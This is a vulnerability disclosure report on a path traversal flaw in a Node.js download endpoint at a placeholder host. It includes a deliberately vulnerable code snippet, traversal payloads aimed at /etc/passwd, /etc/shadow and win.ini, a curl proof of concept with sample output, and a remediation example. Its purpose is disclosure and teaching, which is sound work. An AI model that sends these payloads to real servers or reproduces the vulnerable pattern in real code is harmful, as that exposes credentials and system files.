# 🐞 Path Traversal (Path Injection) Vulnerability Report

---

## 📌 Title

**Path Traversal in File Download Endpoint via `filename` Parameter**

---

## 📝 Description

A **Path Traversal** vulnerability was discovered in the file handling logic of the application. The vulnerability allows an attacker to read arbitrary files from the server by manipulating file paths using sequences like `../`.

This occurs due to improper sanitization of user-controlled path input, allowing attackers to escape the intended directory and access sensitive files such as `/etc/passwd`, `web.config`, or `.env`.

---

## 🌐 Affected Endpoint

- **URL**: `https://vulnerable-website.com/download?file=report.pdf`
- **Method**: `GET`
- **Vulnerable Parameter**: `file`

---

## ⚙️ Vulnerable Code Snippet (Node.js Example)

```javascript
// ❌ Vulnerable code
app.get('/download', (req, res) => {
    const filePath = path.join(__dirname, 'files', req.query.file);
    res.sendFile(filePath); // No sanitization
});
```

---

## 🧪 Steps to Reproduce

### ✅ Pre-requisites

- Use Burp Suite, browser, or curl

---

### 🔁 Step-by-Step Exploitation

#### Step 1: Access normal file (for reference)

```http
GET /download?file=report.pdf
```

✅ Returns: `report.pdf` from `/files/` directory

---

#### Step 2: Attempt path traversal

```http
GET /download?file=../../../../etc/passwd
```

#### Step 3: Observe response

✅ Returns: contents of `/etc/passwd`

You may try platform-specific paths:

- Windows: `../../../../windows/win.ini`
- Linux: `../../../../etc/shadow` (may be permission-restricted)

---

## 💣 Proof of Concept (PoC)

```bash
curl "https://vulnerable-website.com/download?file=../../../../etc/passwd"
```

```plaintext
root:x:0:0:root:/root:/bin/bash
...
```

---

## 🔥 Security Impact

- Unauthorized access to system files
- Leakage of credentials/configs (`.env`, `config.json`, `db.sqlite`, etc.)
- Information disclosure
- Local file inclusion in some environments (may lead to RCE)

---

## 🔧 Recommended Remediation

- Normalize and validate paths before use
- Enforce a whitelist of allowed filenames
- Prevent `..`, `~`, or absolute path inputs

### ✅ Secure Fix Example

```javascript
const path = require('path');
const safeBase = path.join(__dirname, 'files');
const requestedPath = path.normalize(path.join(safeBase, req.query.file));

if (!requestedPath.startsWith(safeBase)) {
    return res.status(400).send('Invalid file path');
}

res.sendFile(requestedPath);
```

---

## 🔐 Security Best Practices

- Never trust user input for file paths
- Implement input validation and sanitization
- Log abnormal access patterns
- Disable directory listing on the web server
- Restrict file permissions (e.g., use non-root users)

---

## 🧾 References

- [OWASP Directory Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [Node.js Path Traversal Guide](https://blog.doyensec.com/2021/08/30/nodejs-path-traversal.html)

---

## 📅 Report Date

**2025-06-17**

---

## 🧑‍💻 Reported By

- **Security Researcher**: raghav  
- **Tools Used**: Burp Suite, curl, manual analysis  
- **Severity**: **High**

---

> ⚠️ This issue is shared under responsible disclosure. Please review and confirm. I kindly request acknowledgment or reward consideration if the issue is valid.
